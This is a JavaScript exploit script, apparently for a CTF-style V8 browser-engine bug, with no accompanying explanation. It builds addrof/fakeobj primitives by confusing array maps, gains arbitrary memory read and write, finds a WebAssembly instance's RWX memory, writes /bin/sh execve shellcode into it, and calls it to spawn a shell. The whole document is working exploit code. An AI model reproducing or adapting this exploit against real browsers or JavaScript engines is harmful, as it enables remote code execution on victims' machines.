var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { 
	f64_buf[0] = val;
	return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function itof(val) { 
	u64_buf[0] = Number(val & 0xffffffffn);
	u64_buf[1] = Number(val >> 32n);
	return f64_buf[0];
}

function addrof(obj){
  oob[1] = itof(object_map); 
  oob[0] = obj;
  oob[1] = itof(double_map);
  return ftoi(oob[0])&0xffffffffn;
}
function fakeobj(addr){
  oob[1] = itof(double_map);
  oob[0] = itof(BigInt(addr));
  oob[1] = itof(object_map);
  return oob[0];
}

function aar(addr){
  var oob2 = double_arr.slice(0);
  oob2[1] = itof(double_map);
  oob2[2] = itof((0x10n << 32n) + addr-0x8n);
  var addr = ftoi(oob2[0]);
  return addr;
}
function aaw(addr, value){
  var oob2 = double_arr.slice(0);
  oob2[1] = itof(double_map);
  oob2[2] = itof((0x10n << 32n) + addr-0x8n);
  oob2[0] = itof(value);
}
function write_shellcode(){
	shellcode = [0x90909090d2314850n, 0x69622fbb48f63148n, 0x5f545368732f2f6en, 0x90909090050f3bb0n];
	rwx_high = rwx & 0xffffffffn;
	rwx_low = rwx / 0x100000000n;
	let backingStoreAddr = addrof(target_buffer)+0x18n;
	aaw(backingStoreAddr, rwx>>32n);
	aaw(backingStoreAddr-4n, rwx);

	for(let i =0; i<shellcode.length;i++){
		dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, itof(shellcode[i]), true);
	}

}
var double_arr = [1.1];
var object_arr = [{a:1}];
var oob = double_arr.slice(0);
var double_map = ftoi(oob[1]);
var object_map = double_map + 80n;


var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(target_buffer);

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
     
let wasmFunction = wasmInstance.exports.main;

let rwx = aar(addrof(wasmInstance) + 0x67n) >> 8n;
console.log("[+] rwx : 0x"+rwx.toString(16));
write_shellcode();
wasmFunction();
